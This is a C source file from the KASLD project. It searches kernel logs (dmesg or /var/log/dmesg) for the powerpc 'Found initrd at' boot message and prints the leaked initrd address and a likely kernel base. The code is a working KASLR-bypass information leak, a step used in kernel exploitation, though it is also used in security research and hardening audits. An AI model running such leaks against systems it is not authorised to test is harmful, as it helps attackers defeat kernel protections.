// This file is part of KASLD - https://github.com/bcoles/kasld
//
// check_for_initrd() prints initrd start address during boot:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/powerpc/kernel/setup-common.c#L385
//
// ppc64:
// [    0.000000] Found initrd at 0xc000000001a00000:0xc000000002a26000
//
// Requires:
// - CONFIG_BLK_DEV_INITRD=y
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.1.1/source/arch/powerpc/kernel/setup-common.c#L385
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long search_dmesg_check_for_initrd() {
  char *syslog;
  char *endptr;
  char *substr;
  char *line_buf;
  const char *needle = "Found initrd at 0x";
  int size;
  unsigned long addr = 0;

  printf("[.] searching dmesg for check_for_initrd() info ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  substr = strstr(syslog, needle);
  if (substr == NULL)
    return 0;

  line_buf = strtok(substr, "\n");
  if (line_buf == NULL)
    return 0;

  /* Found initrd at 0xc000000001a00000:0xc000000002a26000 */
  // printf("%s\n", line_buf);

  addr = strtoul(&line_buf[strlen(needle)], &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

unsigned long search_dmesg_log_file_check_for_initrd() {
  FILE *f;
  char *endptr;
  char *substr;
  char *line_buf;
  const char *path = "/var/log/dmesg";
  const char *needle = "Found initrd at 0x";
  unsigned long addr = 0;
  char buff[BUFSIZ];

  printf("[.] searching %s for check_for_initrd() info ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    perror("[-] fopen");
    return 0;
  }

  while ((fgets(buff, BUFSIZ, f)) != NULL) {
    substr = strstr(buff, needle);
    if (substr == NULL)
      continue;

    line_buf = strtok(substr, "\n");
    if (line_buf == NULL)
      break;

    /* Found initrd at 0xc000000001a00000:0xc000000002a26000 */
    // printf("%s\n", line_buf);

    addr = strtoul(&line_buf[strlen(needle)], &endptr, 16);

    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
      break;
  }

  fclose(f);

  return addr;
}

int main() {
  unsigned long addr = search_dmesg_check_for_initrd();
  if (!addr)
    addr = search_dmesg_log_file_check_for_initrd();

  if (!addr)
    return 1;

  printf("leaked initrd start: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  return 0;
}
